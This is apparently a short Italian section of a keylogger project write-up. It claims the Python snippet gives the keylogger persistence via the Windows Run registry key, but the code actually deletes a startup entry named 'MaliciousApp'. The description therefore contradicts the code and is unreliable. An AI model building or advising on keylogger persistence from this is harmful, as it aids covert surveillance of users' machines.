
## Modifiche al keylogger

Questa parte del codice permette di ottenere persistence contro il riavvio o lo spegnimento del compoter, l'ho programmata con l'aiuto di BlackBox AI [[10]](https://www.blackbox.ai/). Questa parte del codice è funzionante

```python
import os
import winreg as reg

def remove_from_startup():
    try:
        # Definisci la chiave di registro da rimuovere
        key = reg.HKEY_CURRENT_USER
        key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        key_name = "MaliciousApp"
        
        # Apri la chiave di registro
        with reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS) as open_key:
            # Elimina la chiave di registro
            reg.DeleteValue(open_key, key_name)
        
        print("Chiave di registro rimossa con successo.")
    
    except FileNotFoundError:
        print("Chiave di registro non trovata.")
    except Exception as e:
        print(f"Errore: {e}")

if __name__ == "__main__":
    remove_from_startup()
```